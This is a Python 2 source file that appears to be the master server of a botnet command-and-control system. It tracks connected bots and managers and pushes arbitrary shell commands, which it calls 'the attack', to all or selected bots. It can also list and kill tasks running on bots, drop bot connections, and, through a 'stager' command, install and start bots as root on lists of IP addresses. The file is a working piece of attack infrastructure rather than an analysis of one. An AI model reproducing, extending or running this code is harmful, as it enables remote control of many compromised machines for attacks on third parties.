#!/usr/local/bin/python
from twisted.internet import reactor
import json, os, ConfigParser, inspect, time
from ccapi.Messaging import PrintableResponseMessage, DataResponseMessage

from ccserverapi import BaseProtocolBuilderFactory, ServerPool
from ccapi.Messaging import ApiRequestMessage
from ccserverapi.BotBuilder import BotBuilder


class BaseApi():
    def getApiRef(self):
        methods = inspect.getmembers(self, predicate=inspect.ismethod)
        api = {}
        methods.pop(0)
        for method in methods:
            methodName, methodInstance = method
            if not methodName == 'getApiRef' and not methodName.startswith("_"):
                doc = inspect.getdoc(getattr(self, methodName))
                # methodArgs = inspect.getargspec(methodInstance).args
                # time.sleep(1)
                api[methodName] = json.loads(doc)

        res = DataResponseMessage()
        res.setDataDict(api)
        return res


class CommandPublisher():
    timeOutCount = 100

    def __init__(self, command, connections):
        self.command = command
        self.connections = connections
        self.published = False
        self._sessions = []
        self._successors = []
        self._failiures = []
        pass

    def sendRequests(self):
        self._sessions = []
        self._successors = []
        self._failiures = []
        for i in self.connections:
            session = i.sendRequest(self.command)
            self._sessions.append(session)

    def wait(self):
        count = 0
        targetSessions = self._sessions
        while True:
            analyseSessions = []
            for s in targetSessions:
                if s.isResponseReceived():
                    self._successors.append(s)
                else:
                    analyseSessions.append(s)

            if not len(analyseSessions):
                break

            targetSessions = analyseSessions

            time.sleep(0.1)
            if count > self.timeOutCount:
                self._failiures = analyseSessions
                return None

            count += 1

    def getSuccesorSessions(self):
        return self._successors

    def getFailureSessions(self):
        return self._failiures

    def getFailureMessages(self, messagePrefix='Failed IP Address [Timed-Out] : '):
        messages = []
        for i in self.getFailureSessions():
            messages.append("%s %s:%s" % (messagePrefix, i.getOpponentIpIndex().host, i.getOpponentIpIndex().port))

        return messages


class TheApi(BaseApi):
    def __init__(self, pool, botsClassName, managersClassName):
        self.pool = pool
        self.botsClassName = botsClassName
        self.managersClassName = managersClassName

    def __getConnectionsOnly(self):
        con = []
        for address, bot in self.pool.getServer(self.botsClassName).connections.items():
            con.append(bot)

        return con

    def listmanagers(self):
        """
        {
            "doc": "List all connected managers."
        }
        """
        response = PrintableResponseMessage()
        response.setTableHeader(['IP', 'PORT'])
        for ipv4, bot in self.pool.getServer(self.managersClassName).connections.items():
            response.addTableRow([ipv4.host, ipv4.port])

        return response

    def listbots(self):
        """
        {
            "doc": "List all connected bots."
        }
        """
        response = PrintableResponseMessage()
        response.setTableHeader(['IP', 'PORT'])
        for ipv4, bot in self.pool.getServer(self.botsClassName).connections.items():
            response.addTableRow([ipv4.host, ipv4.port])

        return response

    def execute(self, command, ip=None, port=None, if_not_exists=False):
        """
        {
            "doc": "Command of the attack which will push to bot servers.",
            "argument": {
                "target": "command"
            },
            "options": {
                "ip": {
                    "short": "-i",
                    "long": "--ip",
                    "type": "string",
                    "help": "IP Address filter, only this ip will execute"
                },
                "port": {
                    "short": "-p",
                    "long": "--port",
                    "type": "string",
                    "help": "Port of the bots connection"
                },
                "if_not_exists":{
                    "short": "-e",
                    "long": "--if-not-exists",
                    "action": "store_true",
                    "help": "Run command if bot not currently executing same command. Default: False - [False/True]",
                    "default": false
                }
            }
        }
        """
        message = ApiRequestMessage()
        if if_not_exists:
            message.setAction('if_not_exists')
        else:
            message.setAction('execute')

        message.setArguments({'command': command})

        targetBots = self.pool.getServer(self.botsClassName).getConnections(ip=ip, port=port).values()
        publisher = CommandPublisher(message, targetBots)
        publisher.sendRequests()

        return PrintableResponseMessage().addNotification('Command Published')

    def commands(self, command=None, ip=None, port=None, kill=False, search=False):
        """
        {
            "doc": "Get all commands currently executing on bot servers.",
            "argument": {
                "target": "command",
                "required": false
            },
            "options": {
                "port": {
                    "short": "-p",
                    "long": "--port",
                    "type": "string",
                    "help": "Port of the bots connection. Ports will mets match if they are exactly the same."
                },
                "ip": {
                    "short": "-i",
                    "long": "--ip",
                    "type": "string",
                    "help": "IP Address filter. If input '127.0', '127.0.0.1' will be selected."
                },
                "kill": {
                    "short": "-k",
                    "long": "--kill",
                    "action": "store_true",
                    "help": "Dont get commands, search the commands and kill them."
                },
                "search": {
                    "short": "-s",
                    "long": "--search",
                    "action": "store_true",
                    "help": "Search the commands on bots."
                }
            }
        }
        """

        if search:
            if command is None:
                return PrintableResponseMessage().addWarning(
                    'You must define argument when you use --search option!')

            message = ApiRequestMessage()
            message.setAction('searchTasks')
            message.setArguments({'task': command})

            targetBots = self.pool.getServer(self.botsClassName).getConnections(ip=ip, port=port).values()
            publisher = CommandPublisher(message, targetBots)
            publisher.sendRequests()
            publisher.wait()
            sessions = publisher.getSuccesorSessions()

            res = PrintableResponseMessage()
            res.setTableHeader({'ip': 'IPv4 Addr.', 'process': 'Command'})
            for s in sessions:
                message = s.getResponseMessage()
                if 'data' in message:
                    for m in message['data']:
                        res.addTableRow(
                            {'ip': "%s:%s" % (s.getOpponentIpIndex().host, s.getOpponentIpIndex().port), 'process': m})

            for m in publisher.getFailureMessages():
                res.addWarning(m)

            return res
        elif kill:
            if command is None:
                return PrintableResponseMessage().addWarning(
                    'You must define argument when you use --kill option!')

            message = ApiRequestMessage()
            message.setAction('killTask')
            message.setArguments({'task': command})

            targetBots = self.pool.getServer(self.botsClassName).getConnections(ip=ip, port=port).values()
            publisher = CommandPublisher(message, targetBots)
            publisher.sendRequests()

            return PrintableResponseMessage().addNotification(['Kill request published.'])
        else:
            message = ApiRequestMessage()
            message.setAction('getTasks')
            message.setArguments({})

            targetBots = self.pool.getServer(self.botsClassName).getConnections(ip=ip, port=port).values()
            publisher = CommandPublisher(message, targetBots)
            publisher.sendRequests()
            publisher.wait()
            sessions = publisher.getSuccesorSessions()

            if sessions is None:
                return PrintableResponseMessage().addNotification('Timed Out')

            res = PrintableResponseMessage()
            for s in sessions:
                message = s.getResponseMessage()
                if 'data' in message:
                    for m in message['data']:
                        res.addTableRow(
                            {'ip': "%s:%s" % (s.getOpponentIpIndex().host, s.getOpponentIpIndex().port), 'process': m})

            res.setTableHeader({'ip': 'IP Index', 'process': 'Process', })

            for m in publisher.getFailureMessages():
                res.addWarning(m)

            return res

    def stager(self, ip, only_install=False, only_execute=False, only_kill=False):
        """
        {
            "doc": "This command will connect to ip address over IP and install bot to the server. In default it will install and execute bot. All installments will be done in parallel so send all ips. IP Address format => '127.0.0.1, 127.0.0.2'",
            "argument": {
                "target": "ip"
            },
            "options": {
                "only_install": {
                    "short": "-i",
                    "long": "--only-install",
                    "help": "Do not try to execute bot, only install it.",
                    "action": "store_true"
                },
                "only_execute": {
                    "short": "-e",
                    "long": "--only-execute",
                    "help": "Do not try to install, only execute it.",
                    "action": "store_true"
                },
                "only_kill": {
                    "short": "-k",
                    "long": "--only-kill",
                    "help": "Kill all python processes!",
                    "action": "store_true"
                }
            }
        }
        """
        response = PrintableResponseMessage()
        validatedIps = []

        import ipaddress
        for i in ip.split(','):
            i = i.strip(' ')
            try:
                ipaddress.ip_address(i)
                validatedIps.append(i)
            except Exception as e:
                response.addWarning('IP Address validation failed. Addr: %s' % i)

        if not len(validatedIps):
            response.addWarning('No any valid ip address found!')
            return response

        builder = BotBuilder(validatedIps, {'user': 'root'})
        if only_kill:
            builder.kill()
        else:
            if only_install:
                builder.deploy()
            elif only_execute:
                builder.start()
            else:
                builder.deploy()
                builder.start()

        return response.addNotification('Stager Done')

    def dropbots(self, ip=None, port=None, counted_drop=None, drop_all=False):
        """
        {
            "doc": "This command will connect to ip address over IP and install bot to the server. Parameter informations can be found with `listbots` command",
            "options": {
                "port": {
                    "short": "-p",
                    "long": "--port",
                    "type": "string",
                    "help": "Port of the bots connection"
                },
                "ip": {
                    "short": "-i",
                    "long": "--ip",
                    "type": "string",
                    "help": "IP Address filter."
                },
                "drop_all": {
                    "short": "-d",
                    "long": "--drop-all",
                    "action": "store_true",
                    "help": "Drop all bots, filters will not work."
                },
                "counted_drop": {
                    "short": "-c",
                    "long": "--counted-drop",
                    "type": "int",
                    "help": "Drop up to X bots."
                }
            }
        }
        """
        command = ApiRequestMessage()
        command.setAction('dropConnection')

        if drop_all:
            targetBots = self.pool.getServer(self.botsClassName).getConnections()
        elif counted_drop is not None:
            targetBots = self.pool.getServer(self.botsClassName).getFirstXConnections(counted_drop)
        elif ip is not None or port is not None:
            targetBots = self.pool.getServer(self.botsClassName).getConnections(ip=ip, port=port)
        else:
            return PrintableResponseMessage().addWarning('One of the options must be selected!')

        if not len(targetBots) > 0:
            return PrintableResponseMessage().addNotification('No any bot found.')

        responseMessage = PrintableResponseMessage()
        responseMessage.addNotification('Bots dropped')
        responseMessage.setTableHeader(['ip', 'port'])

        for ipv4, con in targetBots.items():
            responseMessage.addTableRow([ipv4.host, ipv4.port])

        publisher = CommandPublisher(command, targetBots.values())
        publisher.sendRequests()

        import pty

        for ipv4, con in targetBots.items():
            try:
                self.pool.getServer(self.botsClassName).removeConnectionFromList(ipv4)
            except Exception as e:
                print e.message

        return responseMessage


class ServerInitialzier():
    manager_api_port = 62001
    bot_api_port = 62000

    def __init__(self):
        scriptPath = os.path.dirname(os.path.realpath(__file__))
        scriptPath = os.path.join(scriptPath, 'master.conf')
        from ccapi import Configurer
        file = Configurer.FileConfigPointer(scriptPath)
        Configurer.configure(Configurer.ApplicationType.Manager, file)
        Configurer.patch(self)

    def run(self):
        serverPool = ServerPool()
        reactor.listenTCP(int(self.manager_api_port),
                          BaseProtocolBuilderFactory(serverPool,
                                                     'ccserverapi.ApiServer',
                                                     'ApiServer',
                                                     {'api': TheApi(serverPool, 'ccserverapi.NoneServer.NoneServer',
                                                                    'ccserverapi.ApiServer.ApiServer')})
                          )
        reactor.listenTCP(int(self.bot_api_port),
                          BaseProtocolBuilderFactory(serverPool,
                                                     'ccserverapi.NoneServer',
                                                     'NoneServer')
                          )

        print 'Manager API On : ', self.manager_api_port
        print 'Bots API On : ', self.bot_api_port
        reactor.run()


if __name__ == "__main__":
    s = ServerInitialzier()
    s.run()
